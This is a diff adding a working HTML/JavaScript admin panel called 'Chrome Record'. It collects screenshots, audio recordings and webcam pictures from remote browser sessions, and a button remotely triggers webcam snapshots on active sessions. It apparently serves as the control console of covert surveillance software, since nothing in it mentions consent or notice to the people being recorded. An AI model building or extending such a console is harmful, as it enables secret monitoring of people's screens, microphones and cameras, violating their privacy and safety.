@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Record - Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+            font-size: 80%;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        .header h1 {
+            color: #4a5568;
+            margin-bottom: 10px;
+            font-size: 1.5em;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+
+        .main-content {
+            display: flex;
+            height: 70vh;
+            gap: 20px;
+        }
+
+        .panel {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            min-height: 0;
+        }
+
+        .sessions-panel {
+            flex: 1 1 300px;
+            min-width: 250px;
+            max-width: 400px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .recordings-panel {
+            flex: 2 1 0;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            min-height: 0;
+            overflow: hidden;
+        }
+
+        .recordings-containers {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            gap: 16px;
+            min-height: 0;
+        }
+
+        .recordings-section {
+            flex: 1 1 0;
+            min-height: 0;
+            overflow-y: auto;
+            background: #f7fafc;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 0;
+        }
+
+        .recordings-section h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .connection-list {
+            flex: 1 1 auto;
+            overflow-y: auto;
+        }
+
+        .connection-item {
+            background: #f7fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .connection-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .connection-item.active {
+            border-color: #48bb78;
+            background: #f0fff4;
+        }
+
+        .connection-id {
+            font-family: monospace;
+            font-size: 0.9em;
+            color: #718096;
+            margin-bottom: 5px;
+        }
+
+        .connection-stats {
+            display: flex;
+            gap: 15px;
+            font-size: 0.9em;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+            margin: 2px;
+        }
+
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn.danger {
+            background: linear-gradient(135deg, #f56565, #e53e3e);
+        }
+
+        .btn.success {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+        }
+
+
+
+        .recording-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .recording-item:last-child {
+            border-bottom: none;
+        }
+
+        .recording-info {
+            flex: 1;
+        }
+
+        .recording-name {
+            font-weight: 500;
+            margin-bottom: 2px;
+        }
+
+        .recording-time {
+            font-size: 0.8em;
+            color: #718096;
+        }
+
+        .recording-actions {
+            display: flex;
+            gap: 5px;
+        }
+
+        .refresh-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover {
+            transform: rotate(180deg);
+        }
+
+        .no-connections {
+            text-align: center;
+            color: #718096;
+            padding: 40px;
+            font-style: italic;
+        }
+
+        .delete-session-btn {
+            margin: 10px 0 0 0;
+            padding: 8px 16px;
+            background: linear-gradient(135deg, #f56565, #e53e3e);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1em;
+            width: 100%;
+        }
+
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
+                height: auto;
+            }
+            .sessions-panel, .recordings-panel {
+                max-width: 100%;
+                min-width: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Chrome Record - Admin Panel</h1>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="activeConnections">0</div>
+                    <div>Active Connections</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalSessions">0</div>
+                    <div>Total Sessions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalScreenshots">0</div>
+                    <div>Screenshots</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalAudio">0</div>
+                    <div>Audio Files</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="totalWebcam">0</div>
+                    <div>Webcam Pictures</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="panel sessions-panel">
+                <h2>Sessions</h2>
+                <div class="connection-list" id="connectionList">
+                    <div class="no-connections">No sessions found</div>
+                </div>
+                <button id="deleteSessionBtn" class="delete-session-btn" style="display:none;">🗑️ Delete Session</button>
+            </div>
+            <div class="panel recordings-panel">
+                <h2>Recordings</h2>
+                <div class="recordings-containers">
+                    <div class="recordings-section" id="screenshotsSection">
+                        <h3>Screenshots</h3>
+                        <div id="screenshotsList"><div class="no-connections">No screenshots</div></div>
+                    </div>
+                    <div class="recordings-section" id="audioSection">
+                        <h3>Audio</h3>
+                        <div id="audioList"><div class="no-connections">No audio</div></div>
+                    </div>
+                    <div class="recordings-section" id="webcamSection">
+                        <h3>Webcam Pictures</h3>
+                        <div id="webcamList"><div class="no-connections">No webcam pictures</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+    <script>
+        let connections = [];
+        let selectedConnection = null;
+        let refreshInterval;
+        let adminWs = null;
+
+        // Fetch connections data
+        async function fetchConnections() {
+            try {
+                const response = await fetch('/api/connections');
+                connections = await response.json();
+                updateUI();
+            } catch (error) {
+                console.error('Error fetching connections:', error);
+            }
+        }
+
+        // Update UI with current data
+        function updateUI() {
+            updateStats();
+            updateConnectionList();
+            updateRecordingsList();
+        }
+
+        // Update statistics
+        function updateStats() {
+            const totalSessions = connections.length;
+            const activeConnections = connections.filter(conn => conn.active).length;
+            const totalScreenshots = connections.reduce((sum, conn) => sum + conn.screenshots.length, 0);
+            const totalAudio = connections.reduce((sum, conn) => sum + conn.audio.length, 0);
+            const totalWebcam = connections.reduce((sum, conn) => sum + (conn.webcam ? conn.webcam.length : 0), 0);
+
+            document.getElementById('activeConnections').textContent = activeConnections;
+            document.getElementById('totalSessions').textContent = totalSessions;
+            document.getElementById('totalScreenshots').textContent = totalScreenshots;
+            document.getElementById('totalAudio').textContent = totalAudio;
+            document.getElementById('totalWebcam').textContent = totalWebcam;
+        }
+
+        // Update connection list
+        function updateConnectionList() {
+            const container = document.getElementById('connectionList');
+            
+            if (connections.length === 0) {
+                container.innerHTML = '<div class="no-connections">No sessions found</div>';
+                return;
+            }
+
+            // Sort sessions by latest activity (lastScreenshot or lastAudio)
+            const sortedConnections = [...connections].sort((a, b) => {
+                const aTime = Math.max(a.lastScreenshot || 0, a.lastAudio || 0);
+                const bTime = Math.max(b.lastScreenshot || 0, b.lastAudio || 0);
+                return bTime - aTime;
+            });
+
+            container.innerHTML = sortedConnections.map(conn => `
+                <div class="connection-item ${selectedConnection?.id === conn.id ? 'active' : ''}" 
+                     onclick="selectConnection('${conn.id}')">
+                    <div class="connection-id">${conn.id}</div>
+                    <div class="connection-stats">
+                        <span>📸 ${conn.screenshots.length} screenshots</span>
+                        <span>🎵 ${conn.audio.length} audio files</span>
+                        <span>📷 ${conn.webcam ? conn.webcam.length : 0} webcam</span>
+                        <span>🕒 ${formatTime(conn.lastScreenshot)}</span>
+                        <span>${conn.active ? '🟢 Active' : '⚪ Old'}</span>
+                    </div>
+                    <div style='margin-top:10px; display: flex; gap: 6px; align-items: center;'>
+                        ${(selectedConnection && selectedConnection.id === conn.id) ? `
+                            ${conn.active ? `<button class='btn success' onclick="event.stopPropagation(); takeWebcamSnapshot('${conn.id}')" title="Take Webcam Picture">📷</button>` : ''}
+                            <button class='btn danger' onclick="event.stopPropagation(); deleteSession('${conn.id}')" title="Delete Session">🗑️</button>
+                        ` : ''}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Update recordings list
+        function updateRecordingsList() {
+            const screenshotsList = document.getElementById('screenshotsList');
+            const audioList = document.getElementById('audioList');
+            const webcamList = document.getElementById('webcamList');
+            screenshotsList.innerHTML = '';
+            audioList.innerHTML = '';
+            webcamList.innerHTML = '';
+            if (!selectedConnection) {
+                screenshotsList.innerHTML = '<div class="no-connections">Select a session to view screenshots</div>';
+                audioList.innerHTML = '<div class="no-connections">Select a session to view audio</div>';
+                webcamList.innerHTML = '<div class="no-connections">Select a session to view webcam pictures</div>';
+                return;
+            }
+            const connection = connections.find(c => c.id === selectedConnection.id);
+            // Screenshots
+            if (!connection || connection.screenshots.length === 0) {
+                screenshotsList.innerHTML = '<div class="no-connections">No screenshots</div>';
+            } else {
+                screenshotsList.innerHTML = connection.screenshots.sort((a, b) => {
+                    const getTime = (f) => parseInt(f.split('_').pop().split('.')[0]);
+                    return getTime(b) - getTime(a);
+                }).map(f => {
+                    const timestamp = parseInt(f.split('_').pop().split('.')[0]);
+                    const time = new Date(timestamp);
+                    const url = `/recordings/${connection.id}/screenshots/${f.split('/').pop()}`;
+                    return `
+                        <div class="recording-item">
+                            <div class="recording-info">
+                                <div class="recording-name">📸 ${f.split('/').pop()}</div>
+                                <div class="recording-time">${time.toLocaleString()}</div>
+                            </div>
+                            <div class="recording-actions">
+                                <button class="btn" onclick="viewRecording('${url}', true)" title="View Screenshot">👁️ View</button>
+                                <button class="btn danger" onclick="deleteRecording('${connection.id}', 'screenshots', '${f.split('/').pop()}')" title="Delete Screenshot">🗑️</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+            // Audio
+            if (!connection || connection.audio.length === 0) {
+                audioList.innerHTML = '<div class="no-connections">No audio</div>';
+            } else {
+                audioList.innerHTML = connection.audio.sort((a, b) => {
+                    const getTime = (f) => parseInt(f.split('_').pop().split('.')[0]);
+                    return getTime(b) - getTime(a);
+                }).map(f => {
+                    const timestamp = parseInt(f.split('_').pop().split('.')[0]);
+                    const time = new Date(timestamp);
+                    const url = `/recordings/${connection.id}/audio/${f.split('/').pop()}`;
+                    return `
+                        <div class="recording-item">
+                            <div class="recording-info">
+                                <div class="recording-name">🎵 ${f.split('/').pop()}</div>
+                                <div class="recording-time">${time.toLocaleString()}</div>
+                            </div>
+                            <div class="recording-actions">
+                                <button class="btn" onclick="viewRecording('${url}', false)" title="Play Audio">🔊 Play</button>
+                                <button class="btn danger" onclick="deleteRecording('${connection.id}', 'audio', '${f.split('/').pop()}')" title="Delete Audio">🗑️</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+            // Webcam
+            if (!connection || !connection.webcam || connection.webcam.length === 0) {
+                webcamList.innerHTML = '<div class="no-connections">No webcam pictures</div>';
+            } else {
+                webcamList.innerHTML = connection.webcam.sort((a, b) => {
+                    const getTime = (f) => parseInt(f.split('_').pop().split('.')[0]);
+                    return getTime(b) - getTime(a);
+                }).map(f => {
+                    const timestamp = parseInt(f.split('_').pop().split('.')[0]);
+                    const time = new Date(timestamp);
+                    const url = `/webcam/${connection.id}/${f.split('/').pop()}`;
+                    return `
+                        <div class="recording-item">
+                            <div class="recording-info">
+                                <div class="recording-name">📷 ${f.split('/').pop()}</div>
+                                <div class="recording-time">${time.toLocaleString()}</div>
+                            </div>
+                            <div class="recording-actions">
+                                <button class="btn" onclick="viewWebcam('${url}')" title="View Webcam Picture">👁️ View</button>
+                                <button class="btn danger" onclick="deleteWebcam('${connection.id}', '${f.split('/').pop()}')" title="Delete Webcam Picture">🗑️</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+        }
+
+        // Select connection
+        function selectConnection(connectionId) {
+            selectedConnection = connections.find(c => c.id === connectionId);
+            updateConnectionList();
+            updateRecordingsList();
+        }
+
+
+
+        // View recording
+        function viewRecording(url, isScreenshot) {
+            if (isScreenshot) {
+                window.open(url, '_blank');
+            } else {
+                const audio = new Audio(url);
+                audio.controls = true;
+                const popup = window.open('', '_blank');
+                popup.document.write(`
+                    <html>
+                        <head><title>Audio Player</title></head>
+                        <body style="margin: 20px; font-family: Arial, sans-serif;">
+                            <h2>Audio Recording</h2>
+                            <audio controls autoplay>
+                                <source src="${url}" type="audio/webm">
+                                Your browser does not support the audio element.
+                            </audio>
+                            <br><br>
+                            <a href="${url}" download>Download Audio File</a>
+                        </body>
+                    </html>
+                `);
+            }
+        }
+
+        // View webcam picture
+        function viewWebcam(url) {
+            window.open(url, '_blank');
+        }
+
+        // Delete recording
+        async function deleteRecording(sessionId, type, filename) {
+            // No confirmation for individual recordings
+            try {
+                const response = await fetch(`/recordings/${sessionId}/${type}/${filename}`, { method: 'DELETE' });
+                if (response.ok) {
+                    refreshData();
+                } else {
+                    alert('Failed to delete recording');
+                }
+            } catch (error) {
+                console.error('Error deleting recording:', error);
+                alert('Error deleting recording');
+            }
+        }
+
+        // Delete webcam picture
+        async function deleteWebcam(sessionId, filename) {
+            // No confirmation for individual webcam pictures
+            try {
+                const response = await fetch(`/webcam/${sessionId}/${filename}`, { method: 'DELETE' });
+                if (response.ok) {
+                    refreshData();
+                } else {
+                    alert('Failed to delete webcam picture');
+                }
+            } catch (error) {
+                console.error('Error deleting webcam picture:', error);
+                alert('Error deleting webcam picture');
+            }
+        }
+
+        // Take webcam snapshot
+        async function takeWebcamSnapshot(sessionId) {
+            try {
+                // Find the active connection
+                const connection = connections.find(c => c.id === sessionId);
+                if (!connection || !connection.active) {
+                    alert('Session is not active. Cannot take webcam snapshot.');
+                    return;
+                }
+
+                // Send webcam snapshot request via WebSocket
+                if (adminWs && adminWs.readyState === WebSocket.OPEN) {
+                    adminWs.send(JSON.stringify({
+                        type: "webcam_request",
+                        sessionId: sessionId
+                    }));
+                    console.log('Webcam snapshot request sent for session:', sessionId);
+                } else {
+                    alert('WebSocket connection not available. Please refresh the page.');
+                }
+            } catch (error) {
+                console.error('Error taking webcam snapshot:', error);
+                alert('Error taking webcam snapshot');
+            }
+        }
+
+        // Delete session
+        async function deleteSession(sessionId) {
+            if (!confirm('Are you sure you want to delete this session and all its recordings?')) return;
+            try {
+                const response = await fetch(`/api/session/${sessionId}`, { method: 'DELETE' });
+                if (response.ok) {
+                    selectedConnection = null;
+                    refreshData();
+                } else {
+                    alert('Failed to delete session');
+                }
+            } catch (error) {
+                console.error('Error deleting session:', error);
+                alert('Error deleting session');
+            }
+        }
+
+        // Refresh data
+        function refreshData() {
+            fetchConnections();
+        }
+
+        // Format timestamp
+        function formatTime(timestamp) {
+            if (!timestamp) return 'Never';
+            const time = new Date(timestamp);
+            const now = new Date();
+            const diff = now - time;
+            
+            if (diff < 60000) return 'Just now';
+            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
+            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
+            return time.toLocaleDateString();
+        }
+
+        // Connect to WebSocket for admin panel
+        function connectAdminWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const host = window.location.host;
+            adminWs = new WebSocket(`${protocol}//${host}/ws`);
+            
+            adminWs.onopen = () => {
+                console.log('Admin WebSocket connected');
+            };
+            
+            adminWs.onclose = () => {
+                console.log('Admin WebSocket disconnected');
+                setTimeout(connectAdminWebSocket, 1000);
+            };
+            
+            adminWs.onerror = (error) => {
+                console.error('Admin WebSocket error:', error);
+            };
+            
+            adminWs.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === "webcam_saved_admin") {
+                        console.log('Webcam snapshot saved:', data.data, 'for session:', data.sessionId);
+                        // Open the webcam snapshot in a new window
+                        const url = `/webcam/${data.sessionId}/${data.data}`;
+                        const popup = window.open(url, '_blank');
+                        if (!popup) {
+                            alert('Popup blocked. Please allow popups for this site.');
+                        }
+                        // Refresh data to show the new webcam picture
+                        setTimeout(() => {
+                            refreshData();
+                        }, 500);
+                    }
+                } catch (error) {
+                    console.error('Error parsing WebSocket message:', error);
+                }
+            };
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            connectAdminWebSocket();
+            fetchConnections();
+            refreshInterval = setInterval(fetchConnections, 5000); // Refresh every 5 seconds
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+        });
+    </script>
+</body>
+</html> 
